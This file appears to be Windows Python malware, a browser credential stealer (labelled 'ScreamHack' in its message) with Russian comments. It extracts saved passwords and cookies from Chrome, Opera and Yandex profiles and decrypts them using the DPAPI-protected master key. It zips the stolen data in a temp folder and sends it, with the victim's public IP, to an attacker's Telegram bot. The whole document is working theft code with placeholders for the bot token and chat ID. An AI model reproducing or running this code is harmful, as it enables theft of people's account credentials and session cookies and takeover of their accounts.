token = "YOUR BOT TOKEN" #YOUR TOKEN HERE
chat_id = "YOUR CHAT ID" #YOUR CHAT ID HERE

import os
import sqlite3
import zipfile
import requests
from ctypes import *
from winreg import *
from json import load
from os import listdir
from shutil import copy
from struct import calcsize
from base64 import b64decode
from Crypto.Cipher import AES
from psutil import process_iter
from win32api import GetModuleHandle
from win32crypt import CryptUnprotectData
import telebot

if __name__ == "__main__":

    chromium_browsers = {
        u'google chrome': os.getenv("LOCALAPPDATA") + r'\Google\Chrome\User Data',
        u'opera': os.getenv("APPDATA") + r'\Opera Software\Opera Stable',
        u'yandexBrowser': os.getenv("LOCALAPPDATA") + r'\Yandex\YandexBrowser\User Data'
    }

    PasswordsArray = []
    CookiesDict = {}

    def db_dirs(path):
        databases = set()
        profiles_path = os.path.join(path, u'Local State')
        if os.path.exists(profiles_path):
            profiles = {'Default', ''}
            for dirs in os.listdir(path):
                dirs_path = os.path.join(path, dirs)#
                if os.path.isdir(dirs_path) and dirs.startswith('Profile'):
                    profiles.add(dirs)
            with open(profiles_path) as f:
                try:
                    data = load(f)
                    profiles |= set(data['profile']['info_cache'])
                except Exception:
                    pass
            with open(profiles_path) as f:
                try:
                    master_key = b64decode(load(f)["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                except Exception:
                    master_key = None
            for profile in profiles:
                try:
                    db_files = os.listdir(os.path.join(path, profile))
                except Exception:
                    continue
                for db in db_files:
                    if db.lower() in ['login data','cookies']:
                        databases.add((os.path.join(path, profile, db), master_key))
        return databases
    
    def decryption(buff, key):
        payload = buff[15:]
        iv = buff[3:15]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(name, path, database_path, master_key):
        copy(path, database_path)
        cursor = sqlite3.connect(database_path).cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            url = result[0]
            login = result[1]
            try:
                password = decryption(result[2], master_key)
            except Exception:
                password = "Error"
            if url and login and password != '':
                PasswordsArray.append(
                    'Browser: ' + name + '\nLink: ' + url + '\nLogin: ' + login + '\nPassword: ' + password + '\n')

    def cookies(name, path, database_path, master_key):
        Cookies = [] #Куки добавляются сюда
        copy(path, database_path)#Копируем базу
        cursor = sqlite3.connect(database_path).cursor()
        cursor.execute("SELECT * from cookies")
        for result in cursor.fetchall():
            try:
                cookie = decryption(result[12], master_key)
            except Exception:
                return
            cookie_name = result[2]
            exp = result[5]
            if result[6]:
                secure = "TRUE"
            else:
                secure = "FALSE"
            if result[7]:
                isHttp = "TRUE"
            else:
                isHttp = "FALSE"
            path = result[4]
            url = result[1].replace("https://", "").replace("http://", "").split("/")[0]
            Cookies.append((url + "\t" + secure + "\t" + path + "\t" + isHttp + "\t" + str(
                exp / 1000000) + "\t" + cookie_name + "\t" + str(cookie)))
        for i in range(0, 100):
            if i >= 1:
                if name + str(i) in CookiesDict:
                    continue
                else:
                    CookiesDict[name + str(i)] = Cookies
                    break
            else:
                if name in CookiesDict:
                    continue
                else:
                    CookiesDict[name] = Cookies
                    break
    

    def helper(name, path, database_path, master_key):
        if database_path.endswith("Cookies"):
            copyPath = path + '\Backup Cookies'
            cookies(name, database_path, copyPath, master_key)

        if database_path.endswith("Login Data"):
            copyPath = path + '\Backup Password'
            passwords(name, database_path, copyPath, master_key)
    


    if __name__ == "__main__": #Точка входа в программу

        chromium_browsers = { #Пути до браузеров
            u'google chrome': os.getenv("LOCALAPPDATA") + r'\Google\Chrome\User Data', 
            u'opera': os.getenv("APPDATA") + r'\Opera Software\Opera Stable'}

    for browser, path in chromium_browsers.items():
        if os.path.exists(path):#Есть ли браузер
            for database_path, master_key in db_dirs(path):
                helper(browser, path, database_path, master_key)


    try:
        os.makedirs(os.getenv("TEMP") + '\\Debug\\')
    except OSError:
        pass
    path_main = os.getenv("TEMP") + '\\Debug\\'
    
    zipload = zipfile.ZipFile(os.path.join(path_main, "Data" + ".zip"), 'w')
            
    if (len(PasswordsArray) > 0):
        file = open(os.path.join(path_main, "Passwords.txt"), "w+", encoding='utf-8')
        file.write("\n".join(PasswordsArray))
        file.close()
        zipload.write(os.path.join(path_main, "Passwords.txt"),
                    "\\Browsers\\" + os.path.basename(os.path.join(path_main, "Passwords.txt")))

    if (len(CookiesDict) > 0):
        for browser, cooks in CookiesDict.items():
            file = open(path_main + "\\" + browser + ".txt", "w+", encoding='utf-8')
            file.write("\n".join(cooks))
            file.close()
            zipload.write(path_main + "\\" + browser + ".txt", "\\Cookies\\" + browser + ".txt")
        
    zipload.close()

    zipPath = os.path.join(path_main, "Data" + ".zip")

    proxy_array = ["95.152.0.16:3128"]
    SendData = {'chat_id': chat_id}

    r = requests
    files = {'document': open(zipPath, 'rb')}

    bot = telebot.TeleBot(token)
    bot.send_message(chat_id, "ScreamHack: " + "\n" + "IP: " + requests.get('https://api.ipify.org').text)
    response = r.post("https://api.telegram.org/bot" + token + "/sendDocument", files=files, data=SendData)

print("It's your fault.")
input()
